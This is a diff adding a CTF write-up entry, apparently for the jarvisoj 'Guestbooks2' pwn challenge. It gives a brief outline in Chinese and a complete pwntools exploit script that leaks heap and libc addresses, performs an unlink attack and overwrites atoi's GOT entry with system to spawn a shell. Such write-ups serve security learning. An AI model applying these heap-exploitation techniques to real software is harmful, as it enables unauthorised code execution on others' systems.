@@ -778,5 +778,81 @@
    
    ```
 
+* #### Guestbooks2
+
+   chunk0储存chunk指针
+
+   1. free chunk4、chunk2，此时chunk2的fd指向chunk4
+   2. edit chunk1，覆盖到chunk2的fd前，list可获得chunk4地址
+   3. unlink
+   4. 泄露libc
+   5. 改atoi的got，getshell
+
+   ```python
+   from pwn import *
+   context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']
+   #r = remote('pwn.jarvisoj.com',9879)
+   #context.log_level = "debug"
+   r = process(['./guestbook2'],env = {"LD_PRELOAD":"./libc.so.6"})
+   elf = ELF('./guestbook2')
+   libc = ELF('./libc.so.6')
+   
+   def list():
+   	r.sendlineafter('Your choice:','1')
+   
+   def new(post):
+   	r.sendlineafter('Your choice:','2')
+   	r.sendlineafter('Length of new post:',str(len(post)))
+   	r.sendlineafter('Enter your post:',post)
+   
+   def edit(index, post):
+   	r.sendlineafter('Your choice:','3')
+   	r.sendlineafter('Post number:',str(index))
+   	r.sendlineafter('Length of post:',str(len(post)))
+   	r.sendlineafter('Enter your post:',post)
+   
+   def delete(index):
+   	r.sendlineafter('Your choice:','4')
+   	r.sendlineafter('Post number:',str(index))
+   
+   for i in range(10):
+   	new('f**k')
+   
+   #leak heap
+   delete(3)
+   delete(1)
+   padding = 'f**k' * ((0x80 + 0x10)/4)
+   edit(0, padding)
+   list()
+   r.recvuntil(padding)
+   chunk3 = u64(r.recvuntil("\x0a", drop = True).ljust(8, '\x00'))
+   heap_base = chunk3 - 6176 - 0x90 * 3
+   chunk0 = heap_base + 0x30
+   print(heap_base)
+   print(chunk0)
+   #unlink
+   payload = p64(0x90) + p64(0x80) + p64(chunk0 - 0x18) + p64(chunk0 - 0x10)
+   payload += 'f**k' * ((0x80 - 4 * 8)/4)
+   payload += p64(0x80) + p64(0x90) + 'f**k' * (0x70/4)
+   edit(0, payload)
+   delete(1)
+   gdb.attach(r)
+   #leak libc
+   payload = p64(2) + p64(1) + p64(0x100) + p64(chunk0 - 0x18)
+   payload += p64(1) + p64(0x8) + p64(elf.got["atoi"])
+   payload = payload.ljust(0x100, '\x00')
+   edit(0, payload)
+   list()
+   #gdb.attach(r)
+   r.recvuntil("0. ")
+   r.recvuntil("1. ")
+   libc.address = u64(r.recvuntil("\x0a", drop = True).ljust(8, '\x00')) - libc.sym["atoi"]
+   #get shell
+   edit(1, p64(libc.sym['system']))
+   r.sendlineafter("choice: ", "/bin/sh")
+   r.interactive()
+   
+   ```
+
    
 
